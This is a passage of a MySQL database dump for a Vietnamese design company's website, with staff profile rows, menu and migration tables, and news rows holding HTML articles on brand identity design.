(4, 'Đỗ Viết Toàn', 'Brand Design/UI Design', 'Tốt nghiêp loại khá - Chuyên ngành thiết kế trường Học Viện Công Nghệ Bưu Chính Viễn Thông.\r\n2 năm kinh nghiệm trong lĩnh vực thiết kế.\r\nChuyên viên thiết kế thương hiệu sản phẩm.\r\nPhụ trách thiết kế giao diện người dùng.\r\nThiết kế hình ảnh, banner, bộ nhận diện thương hiệu cùng các ấn phẩm khác.', NULL, '1526458711_7.jpg', '2018-06-25 15:40:18', '2018-06-25 08:40:18'),
(5, 'Hằng Đỗ', 'Brand Design/Ui Design', 'Tốt nghiệp Đại Học Kiến Trúc Hà Nội, Chuyên viên thiết kế và sáng tạo 3+ năm trong lĩnh vực sáng tạo thương hiệu, Nhận dạng hình ảnh thương hiệu, ứng dụng thương hiệu và thiết kế giao diện người dùng (Ui Design). Chịu trách nhiệm lĩnh vực sáng tạo Logo, phát triển hệ thống nhận diện thương hiệu trực quan, các dự án về sản phẩm in ấn.', NULL, '1526458350_5.jpg', '2018-06-25 15:40:02', '2018-06-25 08:40:02'),
(6, 'Nhân Nguyễn', 'Developer/Application', 'Tốt nghiệp Đại Học Khoa Học Tự Nhiên TP.HCM Chuyên nghành Công Nghệ Phần Mềm. 4 Năm trong lĩnh vực xây dựng và phát triển các Website trên nền tảng PHP (Javascript, Opencart, Magento). Phát triển các phần mềm quản lý, Phần mềm từ điển trên trên Android, Window - Chuyên viên nghiên cứu phát triển website và các ứng dụng website.', NULL, '1526459129_10.jpg', '2018-06-25 15:39:46', '2018-06-25 08:39:46'),
(7, 'Đoàn Văn Duy', 'Developer/Application', 'Tốt nghiệp Đại học Công Nghiệp TP.HCM Khoa Công nghệ phần mềm, 4 năm kinh nghiệm Kỹ thuật viên lập trình - Xây dựng website dựa trên nền PHP - Thành thạo PHP,Html, Css, Ajax, SQL, Responsive - Chuyên viên nghiên cứu phát triển website và các ứng dụng website. Thiết kế website doanh nghiệp.', NULL, '1526461015_11.jpg', '2018-06-15 10:05:36', '2018-06-15 03:05:36'),
(8, 'Vũ Hồng Ngọc', 'Ui Design', 'Tốt nghiệp Đại Học Kinh doanh và Công nghệ Hà Nội, chuyên ngành Mỹ thuật ứng dụng - thiết kế đồ họa,  với kinh nghiệm Chuyên viên thiết kế  3+ năm trong lĩnh vực sáng tạo thương hiệu, Nhận dạng hình ảnh thương hiệu, ứng dụng thương hiệu và thiết kế giao diện người dùng (Ui Design). Chịu trách nhiệm lĩnh vực sáng tạo Logo, có kỹ năng tạo hình và phát triển nhận diện thương hiệu dựa trên khuynh hướng xây dựng thương hiệu.', NULL, '1539660977_60.jpg', '2018-10-16 03:43:25', '2018-10-15 20:43:25'),
(9, 'Bùi Xuân Hà', 'Frontend', 'Tốt nghiệp chuyên ngành CNTT đại học GTVT Hà Nội  2015\r\n, tham gia khóa học PHP tại hệ thống đào tạo CNTT T3H – C, \r\n- 3 năm kinh nghiệm trong lĩnh vực Frontend, nghiên cứu và phát triển Website, App Moblie,\r\nThiết kế và phát triển các ứng dụng mềm trên website. Xây dựng website doanh nghiệp.', NULL, '1529980254_13 (2).jpg', '2018-08-06 01:53:50', '2018-08-05 18:53:50');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `menu`
--

CREATE TABLE `menu` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `name_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `alias` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `alias_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `photo` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '0',
  `lever` int(11) NOT NULL DEFAULT '0',
  `parent_id` int(11) NOT NULL DEFAULT '0',
  `title` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `title_en` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `keyword` longtext COLLATE utf8_unicode_ci,
  `keyword_en` text CHARACTER SET utf8,
  `description` longtext COLLATE utf8_unicode_ci,
  `description_en` text CHARACTER SET utf8,
  `com` text COLLATE utf8_unicode_ci,
  `stt` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `menu`
--

INSERT INTO `menu` (`id`, `name`, `name_en`, `alias`, `alias_en`, `photo`, `status`, `lever`, `parent_id`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `com`, `stt`, `created_at`, `updated_at`) VALUES
(3, 'Trang chủ', 'Home', 'http://localhost/thuanduc/', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 1, '2017-12-25 01:40:01', '2017-12-24 18:40:01'),
(2, 'Giới thiệu', 'About', 'http://localhost/thuanduc/gioi-thieu/gioi-thieu-ve-cong-ty', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 2, '2017-12-25 07:19:45', '2017-12-25 00:19:45'),
(12, 'Sản phẩm', 'Product', 'http://localhost/thuanduc/san-pham', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 4, '2017-12-22 04:10:25', '2017-12-21 21:10:25'),
(13, 'Tin tức', 'News', 'tin-tuc', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 6, '2017-12-25 04:52:49', '2017-12-24 21:52:49'),
(18, 'Quan hệ cổ đông', 'Shareholder relations', 'http://localhost/thuanduc/quan-he-co-dong', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 4, '2017-12-25 03:02:09', '2017-12-24 20:02:09'),
(19, 'Khách hàng', 'Customer', 'khach-hang', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 5, '2017-12-25 04:52:41', '2017-12-24 21:52:41'),
(33, 'Liên hệ', 'Contact', 'lien-he', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 8, '2017-12-21 02:54:52', '2017-12-20 19:54:52'),
(20, 'Quá trình phát triển', 'Development process', 'http://localhost/thuanduc/gioi-thieu/qua-trinh-phat-trien', NULL, NULL, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 9, '2017-12-25 07:12:28', '2017-12-25 00:12:28'),
(21, 'Giới thiệu về công ty', 'About us', 'http://localhost/thuanduc/gioi-thieu/gioi-thieu-ve-cong-ty', NULL, NULL, 1, 0, 2, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 8, '2017-12-21 02:55:37', '2017-12-20 19:55:37'),
(23, 'Túi shoping', 'SHOPPING BAG', 'http://localhost/thuanduc/san-pham/tui-shoping', NULL, NULL, 1, 0, 12, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 9, '2017-12-21 02:57:28', '2017-12-20 19:57:28'),
(25, 'Hạt nhựa tái sinh', 'Recycled plastic particles', 'http://localhost/thuanduc/san-pham/hat-nhua-tai-sinh', NULL, NULL, 1, 0, 12, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 11, '2017-12-21 02:58:10', '2017-12-20 19:58:10'),
(26, 'Sự khác biệt', 'Differentiation', 'http://localhost/thuanduc/su-khac-biet', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 3, '2017-12-25 03:20:53', '2017-12-24 20:20:53'),
(27, 'Bao bì nông nghiệp', 'agricultural packaging', 'http://localhost/thuanduc/san-pham/bao-bi-nong-nghiep', NULL, NULL, 1, 0, 12, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 13, '2017-12-21 02:59:42', '2017-12-20 19:59:42'),
(28, 'Bao bì pp', 'pp packaging', 'http://localhost/thuanduc/san-pham/bao-bi-pp', NULL, NULL, 1, 0, 12, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 14, '2017-12-21 03:00:23', '2017-12-20 20:00:23'),
(36, 'Tin chứng khoán', NULL, 'http://localhost/thuanduc/tin-tuc/tin-chung-khoan', NULL, NULL, 1, 0, 13, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 17, '2017-12-21 20:58:42', '2017-12-21 20:58:42'),
(34, 'Tuyển dụng', 'Recruitment', 'tuyen-dung', NULL, NULL, 1, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 7, '2017-12-25 04:53:11', '2017-12-24 21:53:11'),
(35, 'Tin hoạt động', 'Active news', 'http://localhost/thuanduc/tin-tuc/tin-hoat-dong', NULL, NULL, 1, 0, 13, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 16, '2017-12-21 19:16:16', '2017-12-21 19:16:16'),
(37, 'Tin tuyển dụng', 'News recruiment', 'tin-tuyen-dung', NULL, NULL, 1, 0, 34, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 18, '2017-12-22 20:40:22', '2017-12-22 20:40:22'),
(38, 'Cơ hội việc làm', 'Jobs', 'http://localhost/thuanduc/co-hoi-viec-lam', NULL, NULL, 1, 0, 34, NULL, NULL, NULL, NULL, NULL, NULL, 'menu-top', 19, '2017-12-25 04:54:46', '2017-12-24 21:54:46');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `migrations`
--

CREATE TABLE `migrations` (
  `migration` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `migrations`
--

INSERT INTO `migrations` (`migration`, `batch`) VALUES
('2014_10_12_000000_create_users_table', 1),
('2014_10_12_100000_create_password_resets_table', 1),
('2017_06_05_042524_create_products_table', 1),
('2017_06_05_045215_create_images_table', 1),
('2017_06_07_033057_create_news_categories_table', 1),
('2017_06_07_033135_create_news_table', 1),
('2017_06_07_033425_create_setting_table', 1),
('2017_06_07_033619_create_pages_table', 1),
('2017_06_07_033944_create_contact_table', 1),
('2017_06_07_034012_create_footer_table', 1),
('2017_06_07_034035_create_slider_table', 1),
('2017_06_07_034117_create_useronline_table', 1),
('2017_06_07_034335_create_order_table', 1),
('2017_06_07_034407_create_order_detail_table', 1),
('2017_06_07_034448_create_newsletter_table', 1),
('2017_06_07_034655_create_order_status_table', 1),
('2017_06_07_064339_create_counter_table', 1),
('2017_06_07_070934_create_partner_table', 1);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `news`
--

CREATE TABLE `news` (
  `id` int(10) UNSIGNED NOT NULL,
  `cate_id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `name_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `alias` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `alias_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `photo` text COLLATE utf8_unicode_ci,
  `background` text COLLATE utf8_unicode_ci,
  `mota` longtext COLLATE utf8_unicode_ci,
  `mota_en` text CHARACTER SET utf8,
  `content` longtext COLLATE utf8_unicode_ci,
  `content_en` text CHARACTER SET utf8,
  `status` int(11) NOT NULL,
  `noibat` int(11) DEFAULT '0',
  `title` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `title_en` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `keyword` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `keyword_en` varchar(25) CHARACTER SET utf8 DEFAULT NULL,
  `description` longtext COLLATE utf8_unicode_ci,
  `description_en` text CHARACTER SET utf8,
  `com` text COLLATE utf8_unicode_ci,
  `stt` int(11) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `news`
--

INSERT INTO `news` (`id`, `cate_id`, `user_id`, `name`, `name_en`, `alias`, `alias_en`, `photo`, `background`, `mota`, `mota_en`, `content`, `content_en`, `status`, `noibat`, `title`, `title_en`, `keyword`, `keyword_en`, `description`, `description_en`, `com`, `stt`, `created_at`, `updated_at`) VALUES
(27, 0, 5, 'Những lưu ý quan trọng khi thiết kế nhận diện thương hiệu cho design mới', 'Important notes when designing a brand identity for a new design', 'nhung-luu-y-quan-trong-khi-thiet-ke-nhan-dien-thuong-hieu-cho-design-moi', 'important-notes-when-designing-a-brand-identity-for-a-new-design', '1539771149_Blog.jpg', '', 'Một công ty nếu muốn đưa thương hiệu, hình ảnh của mình phổ biến rộng rãi tới người tiêu dùng...', NULL, '<p style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">Một c&ocirc;ng ty nếu muốn đưa thương hiệu, h&igrave;nh ảnh của m&igrave;nh phổ biến rộng r&atilde;i tới người ti&ecirc;u d&ugrave;ng th&igrave; việc <em><u>thiết kế nhận diện thương hiệu</u></em> l&agrave; hết sức cần thiết, trong đ&oacute; một bộ nhận diện thương hiệu ho&agrave;n chỉnh sẽ thể hiện r&otilde; xu hướng, c&aacute; t&iacute;nh v&agrave; nguyện vọng của c&ocirc;ng ty, phổ biến thương hiệu của m&igrave;nh tới kh&aacute;ch h&agrave;ng.</span></strong></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">Dưới đ&acirc;y l&agrave; một số ch&uacute; &yacute; khi thiết kế bộ nhận diện thương hiệu bạn kh&ocirc;ng thể bỏ qua.</span></strong></span></p>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">1. C&aacute;ch sử dụng logo khi thiết kế bộ nhận diện thương hiệu</span></strong></span></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Khi thiết kế bộ nhận diện thương hiệu th&igrave; logo ch&iacute;nh l&agrave; trọng điểm đầu ti&ecirc;n cần ch&uacute; &yacute;, chỉ khi ch&uacute;ng ta c&oacute; một logo ho&agrave;n hảo rồi mới c&oacute; thể ho&agrave;n thiện bộ nhận diện thương hiệu tốt được.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Tất nhi&ecirc;n khi c&oacute; logo th&igrave; logo phải duy tr&igrave; t&iacute;nh thống nhất ở mọi mặt, từ việc vị tr&iacute; d&ugrave;ng logo tới những thay đổi được chấp nhận.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Bạn n&ecirc;n biết rằng log ch&iacute;nh l&agrave; điều đơn giản nhất nhưng cũng trọng t&acirc;m nhất để tất cả mọi người c&oacute; thể x&aacute;c định được thương hiệu của bạn r&otilde; r&agrave;ng hơn, v&igrave; vậy việc sử dụng h&igrave;nh ảnh của logo phải đảm bảo hợp l&yacute; v&agrave; th&iacute;ch đ&aacute;ng.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\"><img src=\"http://brity.vn/upload/29.jpg\" alt=\"\" width=\"1240\" height=\"698\" /></span></p>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">2. C&aacute;ch d&ugrave;ng chữ</span></strong></span></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Chữ viết cũng l&agrave; thứ kh&ocirc;ng thể thiếu trong bộ nhận diện thương hiệu, trong đ&oacute; phong c&aacute;ch từng loại chữ khi in ấn, ứng dụng kỹ thuật số khi sử dụng phải được thống nhất r&otilde; r&agrave;ng.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">C&aacute;ch sử dụng kiểu chữ như thế n&agrave;o trong bộ nhận diện thương hiệu cũng cần c&oacute; quy tắc r&otilde; r&agrave;ng, liệt k&ecirc; ra những kiểu chữ được sử dụng, ứng dụng c&aacute;c loại chữ mỗi khi d&ugrave;ng v&agrave; m&agrave;u sắc, k&iacute;ch thước của chữ&hellip;. Đều l&agrave; yếu tố cần ch&uacute; &yacute;.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Chọn một v&agrave;i kiểu chữ nhất định d&ugrave;ng trong thiết kế sẽ l&agrave;m bộ nhận diện thương hiệu c&agrave;ng th&ecirc;m ho&agrave;n hảo hơn, trong đ&oacute; c&aacute;c kiểu chữ phải c&oacute; li&ecirc;n kết chung v&agrave; c&oacute; t&iacute;nh phổ biến, v&igrave; vậy khi chọn kiểu chữ ch&uacute;ng ta c&oacute; thể xem x&eacute;t ti&ecirc;u đề, phong c&aacute;ch kh&aacute;c nhau để tham khảo v&agrave; sử dụng cho những dự &aacute;n thiết kế nhận diện thương hiệu của m&igrave;nh.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Đa phần những thương hiệu khi thiết kế nhận diện thương hiệu đều d&ugrave;ng hai kiểu chữ ch&iacute;nh, trong đ&oacute; một bộ nhận diện thương hiệu ho&agrave;n hảo kh&ocirc;ng n&ecirc;n d&ugrave;ng qu&aacute; 5 kiểu chữ c&ugrave;ng c&aacute;ch d&ugrave;ng chữ.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\"><img src=\"http://brity.vn/upload/30.jpg\" alt=\"\" width=\"1240\" height=\"698\" /></span></p>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">3. C&aacute;ch sử dụng m&agrave;u sắc khi thiết kế nhận diện thương hiệu</span></strong></span></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Một trong những kh&iacute;a cạnh quan trọng nhất khi thiết kế bộ nhận diện thương hiệu ch&iacute;nh l&agrave; bảng m&agrave;u sắc, trong đ&oacute; sự kết hợp giữa c&aacute;c m&agrave;u sẽ g&oacute;p phần tạo n&ecirc;n t&iacute;nh độc đ&aacute;o cho bộ nhận diện thương hiệu.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Trong đ&oacute; khi thiết kế nhận diện thương hiệu ch&uacute;ng ta cần ph&aacute;c thảo trước c&aacute;c m&agrave;u, c&aacute;ch sử dụng c&aacute;c m&agrave;u như thế n&agrave;o, trong đ&oacute; bao gồm cả m&agrave;u sắc logo cho tới những m&agrave;u sắc l&agrave;m nền, m&agrave;u sắc chữ văn bản c&ugrave;ng với nhiều yếu tố kh&aacute;c nhau.</span>&nbsp;</p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Ch&uacute; &yacute; khi c&acirc;n nhắc số lượng m&agrave;u sắc bạn n&ecirc;n đảm bảo giữ ở mức tối thiểu, c&oacute; thể d&ugrave;ng những phi&ecirc;n bản c&ugrave;ng m&agrave;u nhẹ ho&agrave;n to&agrave;n trong thiết kế.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Ngo&agrave;i ra ch&uacute;ng ta cũng cần x&aacute;c định từng m&agrave;u, t&ecirc;n m&agrave;u v&agrave; gi&aacute; trị m&agrave;u sắc của mỗi dự &aacute;n thiết kế, ph&acirc;n loại r&otilde; m&agrave;u ch&iacute;nh, m&agrave;u phụ v&agrave; sự thay thế c&aacute;c bảng m&agrave;u, tiến tới mới x&aacute;c định gi&aacute; trị in ấn c&ugrave;ng dự &aacute;n kỹ thuật số.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\"><img src=\"http://brity.vn/upload/32.jpg\" alt=\"\" width=\"1400\" height=\"933\" /></span></p>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">4. C&aacute;ch d&ugrave;ng h&igrave;nh ảnh trong thiết kế nhận diện thương hiệu</span></strong></span></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Khi thiết kế bộ nhận diện thương hiệu ch&uacute;ng ta cũng cần c&acirc;n nhắc tới c&aacute;c quy tắc với h&igrave;nh ảnh, trong đ&oacute; h&igrave;nh ảnh c&oacute; thể l&agrave; h&igrave;nh chụp hoặc h&igrave;nh c&aacute;c loại thiết kế, v&agrave; nhớ n&ecirc;n viết chi tiết c&aacute;ch sử dụng v&agrave; chỉnh sửa h&igrave;nh ảnh ra sao khi thiết kế bộ nhận diện thương hiệu.</span></p>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">5. Ch&uacute; &yacute; phong c&aacute;ch viết văn v&agrave; giọng văn</span></strong></span></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Phong c&aacute;ch viết văn v&agrave; giọng văn ch&iacute;nh l&agrave; yếu tố cuối c&ugrave;ng cần ch&uacute; &yacute; khi thiết kế bộ nhận diện thương hiệu, điều n&agrave;y &aacute;p dụng cho mọi thứ từ ti&ecirc;u đề quảng c&aacute;o, th&ocirc;ng c&aacute;o b&aacute;o ch&iacute; tới c&aacute;c b&agrave;i blog.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">B&agrave;i viết cần được ph&aacute;c thảo cẩn thận theo chủ đề ph&ugrave; hợp với thương hiệu m&agrave; bạn đang l&agrave;m, trong đ&oacute; từ kiểu ng&ocirc;n ngữ được sử dụng cần ph&ugrave; hợp với thương hiệu.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Ngo&agrave;i ra những yếu tố kh&aacute;c như độ d&agrave;i b&agrave;i viết, b&agrave;i viết ngắn gọn đơn giản hay d&agrave;i d&ograve;ng phức tạp, giọng văn trang trọng hay b&igrave;nh d&acirc;n đều cần điều chỉnh ph&ugrave; hợp theo từng thương hiệu sau cho th&iacute;ch hợp.</span></p>\r\n<p style=\"text-align: center;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\"><img src=\"http://brity.vn/upload/31.jpg\" alt=\"\" width=\"900\" height=\"564\" /></span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Tốt nhất phong c&aacute;ch viết trong bộ nhận diện thương hiệu phải đảm bảo ph&ugrave; hợp với th&iacute;nh giả v&agrave; độc giả, x&aacute;c định r&otilde; r&agrave;ng mục ti&ecirc;u để điều chỉnh phong c&aacute;ch viết c&ugrave;ng giọng văn ph&ugrave; hợp nhất.</span></p>\r\n<h2 style=\"text-align: justify;\"><span style=\"font-size: 12pt;\"><strong><span style=\"font-family: \'times new roman\', times, serif;\">6. Những thứ cần c&oacute; trong bộ nhận diện thương hiệu</span></strong></span></h2>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">Một bộ nhận diện thương hiệu ho&agrave;n chỉnh cần c&oacute; đầy đủ những thứ sau đ&acirc;y :</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Tổng quan về thương hiệu bao gồm cả lịch sử, tầm nh&igrave;n v&agrave; c&aacute; t&iacute;nh</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Th&ocirc;ng số kỹ thuật logo v&agrave; c&aacute;ch sử dụng logo</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Bảng m&agrave;u</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Bảng chữ</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Hướng dẫn phương tiện truyền th&ocirc;ng đa phương tiện</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Th&ocirc;ng số kỹ thuật sử dụng h&igrave;nh ảnh bao gồm cả phong c&aacute;ch chụp ảnh</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Phong c&aacute;ch viết văn bản v&agrave; giọng văn</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Bố tr&iacute; thiết kế v&agrave; lưới cho in ấn v&agrave; c&aacute;c dự &aacute;n web</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Thiết kế giấy viết thư v&agrave; namecard.</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ T&agrave;i liệu hướng dẫn</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ Th&ocirc;ng số kỹ thuật cho c&aacute;c biển b&aacute;o v&agrave; quảng c&aacute;o ngo&agrave;i trời</span></p>\r\n<p style=\"text-align: justify;\"><span style=\"font-family: \'times new roman\', times, serif; font-size: 12pt;\">+ V&iacute; dụ trực quan để hỗ trợ từng quy tắc (cung cấp c&aacute;c v&iacute; dụ về sử dụng th&iacute;ch hợp v&agrave; kh&ocirc;ng th&iacute;ch hợp cho r&otilde; r&agrave;ng)</span></p>', '<p>For any companies that want to popularize its brand, image to the customers, the design of brand identity is essential which will clearly show the direction, personality and ambition of the company</p>\r\n<p>&nbsp;</p>', 1, 1, NULL, NULL, NULL, NULL, NULL, NULL, 'tin-tuc', 0, '2018-10-17 14:57:35', '2018-10-17 07:57:35'),
(20, 0, 5, 'Phân tích và nghiên cứu', 'ANALYSIS AND RESEARCH', 'phan-tich-va-nghien-cuu', 'analysis-and-research', '1526371645_1.jpg', '', NULL, NULL, '<p>Thiết kế v&agrave; thiết kế hệ thống nhận diện thương hiệu lớn hay nhỏ lu&ocirc;n đ&ograve;i hỏi sự kết hợp giữa nghi&ecirc;n cứu v&agrave; ph&acirc;n t&iacute;ch giữa nh&agrave; thiết kế v&agrave; kh&aacute;ch h&agrave;ng, đ&acirc;y l&agrave; c&aacute;ch tốt nhất để chuyển hướng s&aacute;ng tạo. Kh&aacute;c biệt với c&aacute;c thương hiệu kh&aacute;c. Mặt kh&aacute;c, chủ doanh nghiệp phải buộc phải tham gia ngay từ giai đoạn n&agrave;y.</p>\r\n<ul>\r\n<li>- Nghi&ecirc;n cứu nội bộ</li>\r\n<li>- Hiểu người sử dụng</li>\r\n<li>- Ph&acirc;n t&iacute;ch đối thủ cạnh tranh</li>\r\n</ul>', '<p>Designing and designing a brand identity system, no matter how large or small it is, always requires the great combination of research and analysis between the designer and the customer, which is the best way to redirect creativity. This is how a brand differentiates itself from the others. It is essential that our business owners partitipate from these early stages:</p>\r\n<p>- Internal research</p>\r\n<p>- User understanding</p>\r\n<p>- Competitor analysis</p>', 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 0, '2018-06-15 04:21:01', '2018-06-14 21:21:01'),
(21, 0, 5, 'Thiết kế sáng tạo', 'CREATIVE DESIGN', 'thiet-ke-sang-tao', 'creative-design', '1539656717_02.jpg', '', NULL, NULL, '<p>Đ&acirc;y l&agrave; giai đoạn đ&atilde; quyết định &yacute; tưởng ch&iacute;nh v&agrave; chỉ đạo của dự &aacute;n để thực hiện thiết kế cơ bản, thiết kế cơ bản đ&atilde; ho&agrave;n th&agrave;nh sẽ được tr&igrave;nh b&agrave;y cho kh&aacute;ch hang v&agrave; sẽ được điều chỉnh để chọn mẫu ph&ugrave; hợp nhất. Mẫu được chọn l&agrave; điểm xuất ph&aacute;t để thực hiện tất cả c&aacute;c yếu tố thiết kế của dự &aacute;n.</p>', '<p>In this stage, the key idea and direction of the project are decided to start the basic design. The preliminary design will be presented and adjusted upon customer\'s opinion until the most suitable designing pattern are completed. &nbsp;The chosen pattern shall be the starting point for all the next designing elements of the project.</p>', 1, 0, NULL, NULL, NULL, NULL, NULL, NULL, 'dich-vu', 0, '2018-10-16 02:25:17', '2018-10-15 19:25:17'),
